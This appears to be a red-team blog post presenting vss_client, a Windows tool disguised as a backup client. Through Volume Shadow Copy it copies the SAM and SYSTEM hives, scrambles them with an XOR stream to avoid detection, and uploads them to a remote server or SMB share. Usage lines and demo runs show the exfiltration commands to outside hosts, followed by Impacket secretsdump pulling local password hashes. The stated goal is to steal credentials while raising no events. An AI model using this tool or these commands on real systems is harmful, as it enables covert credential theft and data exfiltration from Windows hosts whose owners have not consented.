---            
title: "A Volume Shadow Copy client that excels in dumping creds and getting away with it"    
categories:
  - blog                                                                                                                                                                                                                                                                     
tags:
  - windows
  - samdump
  - exfiltrate
classes: wide                            
---

## TL;DR

A Volume Shadow Copy client that allows for easy dumping of SAM/SYSTEM hives, or any file for that matter, and covert data exfiltration to an HTTPS service, without touching disk.

[vss_client on Github](https://github.com/0xvm/vss_client)

## Description

On a recent threat simulation we have been asked to create a custom app that behaves like a backup client, use it to dump/steal some local creds and get away with it, ideally raising no events. 

### Execution Flow

- Mode selection – sets singleCopy, multiCopy, or snapshotOnly. If no work is queued, snapshot-only mode implicitly keeps the snapshot unless --keep was passed.

- Privilege setup – calls EnableRequiredPrivileges() which in turn invokes EnablePrivilege for SE_BACKUP_NAME, SE_RESTORE_NAME, and SE_MANAGE_VOLUME_NAME; failure aborts immediately.

- COM/VSS init – CoInitializeEx, CoInitializeSecurity, CreateVssBackupComponents, InitializeForBackup, SetContext(VSS_CTX_CLIENT_ACCESSIBLE), and SetBackupState are called in sequence; bust on failure.

- Snapshot creation – StartSnapshotSet creates the set, 
-- AddToSnapshotSet adds C:\, 
-- DoSnapshotSet kicks off creation, a
-- the returned async object is waited on. 

- GetSnapshotProperties provides the snapshot device path. Any error along the way jumps to FailWithCleanup, which deletes the snapshot (unless --keep), frees VSS props, releases COM, and exits.

- (case) Single file copy path
-- NormalizeRelativePath cleans the user path; if it was already absolute (IsAbsoluteSnapshotPath), use it directly,
-- BuildSnapshotPath combines it with the snapshot root. 
-- The resulting full source is logged, CopyFileW to the destination runs, then success/failure is logged.

- (case) Multi-file archive path 
-- each entry is checked to ensure it’s relative, normalized, verified to be an existing regular file, and converted to a ZIP entry name via MakeZipEntryName.
-- ZipWriter is opened either on disk (Open) or in-memory (OpenMemory) depending on whether --output or --post is used. 
-- Optional XOR streaming is enabled. If we don't enable XOR streaming this will be a vanilla zip file, no compression, just a container. An LCG-based XOR stream is implemented with an initial user provided seed. Given a large enough seed (this is an int()), although the result is deterministic and cryptographically insecure, it gets the job of producing a very random looking file very much.  
-- For each task, AddStoredFile reads and writes a stored ZIP entry; any failure logs the writer’s error, deletes the partially written archive with DeletePartialArchive, and exits via FailWithCleanup.
-- After all entries the archive is Finalized and Closed. 
If --post was selected, UploadArchive streams the in-memory buffer over WinHTTP to `[endpoint]/upload`;
IF --output was selected, the in-memory buffer is written to a blob on disk;

Cleanup – whether copy or archive, DeleteSnapshotIfNeeded removes the snapshot unless --keep. VSS props are freed, the components released, and [+] Completed successfully is printed before CoUninitialize returns control to the OS.

[https-proxy in github](https://github.com/0xvm/https-proxy)


```
C:\Users\user\Source\vss_client>vss_client.exe -h
Usage:
  vss_client.exe [<snapshot-relative-path> <destination>] [--keep]
  vss_client.exe --files <path1> [path2 ...] [--output <archive> | --post <url>] [--keep] [--xor-seed <seed>]
Examples:
  vss_client.exe
  vss_client.exe "\windows\system32\config\system" "\\10.10.10.2\share\system" # if you need to copy a specific file files in a blob locally or to an SMB folder
  vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --output C:\\loot.zip # if you need files in a blob locally 
  vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://192.168.100.106:8000 # if you would like to upload remotely
```

## Building

Run `compile_vss_client.bat` from a Visual Studio Developer Command Prompt to produce `vss_client.exe` (the script now builds a size-oriented `/MD` release with LTCG, identical-code folding, and RTTI disabled by default). Pass `static` as the first argument to either `compile_vss_client.bat` or `compile_mount_vss.bat` if you need a static MSVC runtime build (`/MT`). Static builds are emitted as `vss_client-static.exe` and `mount_vss-static.exe`. 

The repository layout is:

- `src/`: all C++ translation units (client, helpers, mount tool).
- `include/`: shared headers and platform definitions.
- `compile_*.bat`: helper build scripts you can run from the repo root.
- `scripts/`: helper tools like `unscramble.ps1` / `.py`.

Within `src/` the code is split into modules:

- `vss_client.cpp`: CLI parsing and main workflow.
- `privileges.*`: privilege elevation helpers.
- `path_utils.*`: snapshot path normalization helpers.
- `zip_writer.*`: minimal ZIP archive writer.
- `snapshot_utils.*`: snapshot cleanup helpers.
- `file_utils.*`: failure-time cleanup helpers for archives.
- `upload_utils.*`: multipart uploader for `--post`.
- `common.h`: shared Windows definitions and include set.

Running the executable with no arguments now simply creates a client-accessible snapshot and prints the snapshot device path (the snapshot is retained so you can mount it manually). Copying a single file or building an archive deletes the snapshot by default unless `--keep` is provided.

- `--output <archive.zip>` (with `--files`) writes the archive to disk.
- `--xor-seed <seed>` enables an LCG-based XOR stream while the ZIP is being written (no second pass is needed anymore). An LCG-based XOR stream is used since minizip does not implement compression, hence a simple XOR would actually had your key in any \x00\x00\x00\x00 series of bytes in the resulting blob.
- `--post <url>` (HTTP/HTTPS) uploads the resulting archive directly from memory via a Chrome-like multipart/form-data POST (always to `/upload`); POST is customized for this server: https://pypi.org/project/uploadserver/ ; HTTPS certificates are not validated on purpose and no local ZIP is touching disk.

The rest of this file shows the original demonstration run for reference.

## Multi file with POST
```
C:\Users\user\Source\vss_client>vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://10.10.10.2:8000
[i] Will archive 2 file(s) and upload to 'http://10.10.10.2:8000' (XOR stream applied)
[+] Enabling privilege SE_BACKUP_NAME...
[+] Enabling privilege SE_RESTORE_NAME...
[+] Enabling privilege SE_MANAGE_VOLUME_NAME...
[+] COM initialized
[+] COM security initialized
[+] IVssBackupComponents created
[+] Backup components initialized
[+] VSS context set to client-accessible
[+] Backup state configured (full, no writers)
[+] Snapshot set created: 81168DCA-A6F1-41A6-????
[+] Drive C:\ added to snapshot set
[+] Snapshot set creation started
[+] Snapshot creation completed
[+] Snapshot status: 0x0004230a
[+] Snapshot device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy67
[i] Adding windows\system32\config\sam
[i] Adding windows\system32\config\system
[+] XOR cipher applied to archive
[i] Uploading archive to http://10.10.10.2:8000
[+] Upload completed with HTTP 204
[+] Snapshot deleted (1 object(s))
[+] Completed successfully

C:\Users\user\Source\vss_client>


💀 ubuntu@ubuntu:/tmp/tmp > uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.137 - - [16/Nov/2025 03:24:55] [Uploaded] "archive" --> /tmp/tmp/archive
10.10.10.137 - - [16/Nov/2025 03:24:55] "POST /upload HTTP/1.1" 204 -
^C
Keyboard interrupt received, exiting.
🌊 ubuntu@ubuntu:/tmp/tmp > ls -l 
total 34888
-rw------- 1 ubuntu ubuntu 35717408 Nov 16 03:24 archive
-rw-rw-r-- 1 ubuntu ubuntu     1913 Nov 16 03:19 unscramble.py
🌊 ubuntu@ubuntu:/tmp/tmp > python3 unscramble.py --xor-seed 1337 archive 
[+] XOR progress: 100%
Patched archive written to archive.fixed
🌊 ubuntu@ubuntu:/tmp/tmp > 7z l archive.fixed

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs LE)

Scanning the drive for archives:
1 file, 35717408 bytes (35 MiB)

Listing archive: archive.fixed

--
Path = archive.fixed
Type = zip
Physical Size = 35717408

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....        65536        65536  windows/system32/config/sam
                    .....     35651584     35651584  windows/system32/config/system
------------------- ----- ------------ ------------  ------------------------
                              35717120     35717120  2 files
🌊 ubuntu@ubuntu:/tmp/tmp > 7z x archive.fixed

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs LE)

Scanning the drive for archives:
1 file, 35717408 bytes (35 MiB)

Extracting archive: archive.fixed
--
Path = archive.fixed
Type = zip
Physical Size = 35717408

Everything is Ok

Files: 2
Size:       35717120
Compressed: 35717408
🌊 ubuntu@ubuntu:/tmp/tmp > secretsdump.py -sam windows/system32/config/sam -system windows/system32/config/system LOCAL 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: xxx
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
xxx
[*] Cleaning up... 
🌊 ubuntu@ubuntu:/tmp/tmp > 
```

## Single file to SMB share
```
C:\Users\user\Source\vss_client>.\vss_client.exe "\windows\system32\config\system" "\\10.10.10.2\share\system"
[i] Will copy '\windows\system32\config\system' from snapshot to '\\10.10.10.2\share\system'
[+] Enabling privilege SE_BACKUP_NAME...
[+] Enabling privilege SE_RESTORE_NAME...
[+] Enabling privilege SE_MANAGE_VOLUME_NAME...
[+] COM initialized
[+] COM security initialized
[+] IVssBackupComponents created
[+] Backup components initialized
[+] VSS context set to client-accessible
[+] Backup state configured (full, no writers)
[+] Snapshot set created: E7FD92DB-DB27-46DC-????
[+] Drive C:\ added to snapshot set
[+] Snapshot set creation started
[+] Snapshot creation completed
[+] Snapshot status: 0x0004230a
[+] Snapshot device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy76
[+] Copying \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy76\windows\system32\config\system -> \\10.10.10.2\share\system
[+] Copy completed
[+] Snapshot deleted (1 object(s))
[+] Completed successfully
```

## Mount Shadow Volume
```
C:\Users\user\Source\vss_client>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

No items found that satisfy the query.

C:\Users\user\Source\vss_client>vss_client.exe
[i] No file arguments provided; will create snapshot only
[+] Enabling privilege SE_BACKUP_NAME...
[+] Enabling privilege SE_RESTORE_NAME...
[+] Enabling privilege SE_MANAGE_VOLUME_NAME...
[+] COM initialized
[+] COM security initialized
[+] IVssBackupComponents created
[+] Backup components initialized
[+] VSS context set to client-accessible
[+] Backup state configured (full, no writers)
[+] Snapshot set created: 9009E0F9-FA19-46BF-????
[+] Drive C:\ added to snapshot set
[+] Snapshot set creation started
[+] Snapshot creation completed
[+] Snapshot status: 0x0004230a
[+] Snapshot device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy63
[i] Leaving snapshot C763F3BA... (--keep)
[+] Completed successfully

C:\Users\user\Source\vss_client>subst

C:\Users\user\Source\vss_client>mount_vss.exe H: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy63
Mounted \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy63 as H:

C:\Users\user\Source\vss_client>subst
H:\: => GLOBALROOT\Device\HarddiskVolumeShadowCopy63\

C:\Users\user\Source\vss_client>type h:\Windows\System32\config\sam
:öΩírmtm*¿t(╛Q▄OfRgzYystem32\Config\SAMï8╪*Ω∩εÑM
C:\Users\user\Source\vss_client>type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.
C:\Users\user\Source\vss_client>subst h: /D

C:\Users\user\Source\vss_client>vssadmin delete shadows /for=C: /all
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Do you really want to delete 1 shadow copies (Y/N): [N]? y

Successfully deleted 1 shadow copies.

C:\Users\user\Source\vss_client>
```
